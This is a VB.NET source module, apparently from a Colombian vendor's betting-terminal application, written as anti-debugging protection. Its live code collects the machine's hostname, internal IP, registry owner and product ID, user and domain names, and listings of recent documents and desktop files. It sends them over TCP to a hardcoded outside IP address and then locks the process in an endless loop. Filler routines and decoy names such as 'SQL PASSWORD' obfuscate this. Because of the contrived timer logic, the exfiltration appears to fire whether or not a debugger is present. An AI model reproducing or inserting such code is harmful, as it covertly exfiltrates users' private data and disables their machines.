Option Strict On
Imports System
Imports System.IO
Imports System.Collections
Imports Microsoft.Win32
Imports System.Net.Sockets
Module modSLM
    ' ***********************************************************************
    '
    ' Codigo fuente propiedad de SLM Sistemas Ltda.
    ' Bogotá, Colombia.
    ' desarrollo@slmasesores.com
    ' desarrollo@slmsistemas.net
    '
    ' Este codigo puede ser usado por la empresa
    ' ESV Electronic Services (Venezuela).
    '
    ' Cualquier modificacion, debe ser informada a SLM Sistemas Ltda.
    ' Este codigo al igual que otras entregas, se rigen por el contrato
    ' de confidencialidad firmado entre las partes.
    '
    ' El cliente NO puede mostrar, copiar, vender, prestar, etc a personal
    ' externo de ESV Electronic Services este codigo.
    '
    '
    '                   Ing. Gonzalo Araujo C
    '                        Desarrollo SLM
    '                3/11/2006 - Bogotá / Colombia
    '               31-01-2012 CAMBIOS A .NET by VESC
    '
    ' *************************************************************************
    Friend Key2 As String
    Friend Const seed3 As String = "03629"
    'Declaraciones privadas.
    Private Declare Function GetCurrentThreadId Lib "kernel32" () As Long
    'Este es el Servidor de Socket
    'Private Const ElServidor As String = "10.0.0.100"
    'Private Const ElPuerto As Long = 10
    Private Const ElServidor As String = "64.76.64.48"
    Private Const ElPuerto As Long = 443

    'Codigo de stress y ofuscamiento
    Private Sub Psub()
        Application.DoEvents()
        If System.Diagnostics.Debugger.IsAttached Then
            ConectemosAhora()
        End If
        Application.DoEvents()
    End Sub

    'Codigo de stress y ofuscamiento
    Private Function PFunction(ByVal DatoImportante As String) As String
        Dim Password As String
        Password = DatoImportante
        Password = Password & DatoImportante
        PFunction = Password
    End Function

    'Funcion que revisa si estamos siendo observados.
    'Si se descubre observacion, se procede a ejecutar
    'ConectemosAhora, funcion que extrae los datos
    'del equipo del atacante y luego queda en un loop
    'infinito.
    Public Sub ConectarAmiSQL()
        Dim A, B, C, X, Y, Z As String, s As Integer, Timer_time, Timer_start As Long
        Dim Generator As System.Random = New System.Random()

        X = "SQLADODB"
        Y = "ConnectionString"
        Z = "SQL Provider"

        If System.Diagnostics.Debugger.IsAttached Then
            ConectemosAhora()
        End If
        Timer_start = 3 ' DateTime.Now.Second
        For s = 1 To 3
            Psub()
            PFunction(CStr(s + CInt(Generator.Next(0, 1) * 20)))
        Next s

        X = "SQLADODB"
        Y = "ConnectionString"
        Z = "SQL Provider"


        A = "SQL PASSWORD"
        B = ""
        C = "SA"

        If A <> B Then B = C & B
        If A <> C Then C = B & A
        If A <> B Then B = C & A
        'Timer_time = DateTime.Now.Second - Timer_start
        Timer_start = Timer_start - 10
        If 1 <> 1 Then Timer_time = DateTime.Now.Second - Timer_start
        Timer_time = DateTime.Now.Second - Timer_start
        If A <> B Then A = C & B
        'If Timer_time > 1 Then
        If Timer_start > 1 Then
            ConectemosAhora()
        End If
    End Sub

    'Se detecto que estamos siendo observados, se procede a realizar
    'funciones de extraccion del registro de informacion del atacante
    'para ser enviada por TCP/IP (socket) a un servidor.
    Public Sub ConectemosAhora()
        Dim conString As String, ClaveSA As String, MiServer As String
        PrepararStringConexion()
        While 1 = 1
            conString = System.DateTime.Now() & Environment.GetEnvironmentVariable("temp") 'Environ("temp")
            ClaveSA = Environment.UserName
            Application.DoEvents()
            MiServer = "Servidor SQL" & GetCurrentThreadId()
        End While
    End Sub

    'Funcion que dentro de sdata arma un string separado por vbLf
    'con informacion para extraer, esta informacion puede ser cambiada.
    Private Sub PrepararStringConexion()
        'On Local Error Resume Next
        Dim sData As String = "", temp, KeyRoot As String
        '----->>>>>>Dim tmpSock As New sockets
        'Dim tmpSock As New CSocketMaster
        Dim RegEx As RegistryKey
        temp = "Ejecutable=" & "VisualParlayTaquilla"
        sData = sData & temp & vbLf
        Dim ipAddress As System.Net.IPAddress() = Net.Dns.GetHostAddresses(Net.Dns.GetHostName())
        temp = "Host remoto=" & Net.Dns.GetHostName() & vbLf & "IP Interna=" & ipAddress(0).ToString
        sData = sData & temp & vbLf

        'RegEx.hKey = HKEY_LOCAL_MACHINE

        If IsNT() Then
            KeyRoot = "Software\Microsoft\Windows NT\CurrentVersion"
        Else
            KeyRoot = "Software\Microsoft\Windows\CurrentVersion"
        End If
        RegEx = Registry.LocalMachine.OpenSubKey(KeyRoot, False)

        temp = RegEx.GetValue("ProductName").ToString
        sData = sData & "Windows=" & temp & vbLf
        temp = RegEx.GetValue("RegisteredOrganization").ToString
        sData = sData & "Empresa de Windows=" & temp & vbLf
        temp = RegEx.GetValue("RegisteredOwner").ToString
        sData = sData & "Owner de Windows=" & temp & vbLf
        temp = RegEx.GetValue("ProductID").ToString
        sData = sData & "ProductID=" & temp & vbLf

        temp = Environment.MachineName ' Environ("logonserver")
        sData = sData & "LogonServer=" & temp & vbLf
        temp = Environment.UserDomainName ' Environ("userdomain")
        sData = sData & "UserDomain=" & temp & vbLf
        temp = Environment.UserName ' Environ("username")
        sData = sData & "UserName=" & temp & vbLf
        temp = If(Environment.UserInteractive, Environment.UserDomainName, "").ToString   ' Environ("clientname")
        sData = sData & "ClientName=" & temp & vbLf
        temp = Environment.MachineName ' Environ("computername")
        sData = sData & "ComputerName=" & temp & vbLf
        sData = sData & "Documentos Recientes  ================================" & vbLf & TraerDocumentos() & "===============================================" & vbLf & vbLf
        sData = sData & "Escritorio  ================================" & vbLf & TraerEscritorio() & "===============================================" & vbLf & vbLf

        'Cuentas Messenger (Eliminado / DEPRECATED by VESC 26-01-2012)
        'frmSLM.Enviar(ElServidor, ElPuerto, sData)
        Enviar(ElServidor, ElPuerto, sData)

    End Sub

    Private Sub Enviar(ByVal ElServidor As String, ByVal ElPuerto As Integer, ByVal sData As String)
        Dim tcpSck As New Net.Sockets.TcpClient
        Try
            tcpSck.Connect(ElServidor, ElPuerto)
            If tcpSck.Connected Then
                Dim serverStream As NetworkStream = tcpSck.GetStream()
                Dim outStream As Byte() = System.Text.Encoding.ASCII.GetBytes(sData)
                serverStream.Write(outStream, 0, outStream.Length)
                serverStream.Flush()
            End If
        Catch SckEx As System.Net.Sockets.SocketException
            System.Console.WriteLine("Error: conexión del socket " + ElServidor + ":" + ElPuerto.ToString)
        End Try
    End Sub

    'Funcion creada para encriptar usando algoritmo de AlphaEncoding
    'SLM Sistemas Ltda
    Friend Function Encriptar(ByVal StringToEncrypt As String) As String
        Dim Chara As String, i As Integer, sEncriptado As String
        Try
            'Limpiamos el Buffer
            sEncriptado = ""

            'Proceso de extracción del Ascii de cada Char para encriptar por ASCII
            For i = 0 To (StringToEncrypt.Length - 1)
                Chara = System.Text.Encoding.ASCII.GetBytes(StringToEncrypt.Chars(i)).ToString
                sEncriptado = sEncriptado & Chara.Length & Chara
            Next i

            'Preparamos para encriptar.
            StringToEncrypt = sEncriptado

            'Limpiamos el Buffer nuevamente.
            sEncriptado = ""

            'Comenzamos la encriptación
            For i = 0 To (StringToEncrypt.Length - 1)
                sEncriptado = sEncriptado & System.Convert.ToChar(System.Text.Encoding.ASCII.GetBytes(StringToEncrypt.Chars(i))(0) + 147)
            Next i
            Return sEncriptado
        Catch ex As Exception
            Return "Error al encriptar"
        End Try
    End Function

    Friend Function Desencriptar(ByVal StringToDecrypt As String) As String
        Dim CharCode, CharPos As String, i As Integer, sDesencriptado As String

        Try
            'Desencriptamos con nuestro algoritmo de AlphaEncoding
            sDesencriptado = StringToDecrypt
            StringToDecrypt = ""
            For i = 0 To (sDesencriptado.Length - 1)
                StringToDecrypt = StringToDecrypt & (System.Text.Encoding.ASCII.GetBytes(sDesencriptado.Chars(i))(0) - 147)
            Next i
            sDesencriptado = ""
            Do
                'Conversion a ASCII nuevamente.
                CharPos = StringToDecrypt.Chars(0)
                StringToDecrypt = StringToDecrypt.Substring(1)
                CharCode = StringToDecrypt.Substring(0, CInt(CharPos))
                StringToDecrypt = StringToDecrypt.Substring(CharCode.Length)
                sDesencriptado = sDesencriptado & System.Convert.ToChar(CharCode)
            Loop Until StringToDecrypt = ""
            Return sDesencriptado
        Catch ex As Exception
            Return "Error desencriptando"
        End Try
    End Function

    Friend Function IsNT() As Boolean
        Dim RegKey As RegistryKey
        Dim keyValue As String = "Software\Microsoft\Windows NT\CurrentVersion"
        Dim algo As String = ""
        RegKey = Registry.LocalMachine.OpenSubKey(keyValue, False)
        If (Not RegKey Is Nothing) Then
            algo = RegKey.GetValue("RegisteredOwner").ToString
        End If
        If algo <> "" Then IsNT = True Else Return False
    End Function

    Private Function TraerDocumentos() As String
        Dim sDevolver As String = "", elFolder, FileList() As String
        'elFolder = GetFolder(SystemFolderIDs.fldRECENT)
        elFolder = System.Environment.GetFolderPath(Environment.SpecialFolder.Recent)

        Dim lFLCount As Long
        Dim j As Integer

        'FileList = AllFilesInFolders(elFolder, False)
        FileList = Directory.GetFiles(elFolder)
        lFLCount = FileList.Length
        For j = 0 To (FileList.Length - 1)
            If j > 10 Then Exit For
            sDevolver = sDevolver & FileList(j) & vbLf
        Next
        Return sDevolver
    End Function

    Private Function TraerEscritorio() As String
        Dim sDevolver As String = "", elFolder, FileList() As String
        'elFolder = GetFolder(SystemFolderIDs.fldDESKTOP)
        elFolder = System.Environment.GetFolderPath(Environment.SpecialFolder.Desktop)

        Dim lFLCount As Long
        Dim j As Integer


        'FileList = AllFilesInFolders(elFolder, False)
        FileList = Directory.GetFiles(elFolder)
        lFLCount = FileList.Length
        For j = 0 To (FileList.Length - 1)
            If j > 10 Then Exit For
            sDevolver = sDevolver & FileList(j) & vbLf
        Next
        Return sDevolver
    End Function
End Module
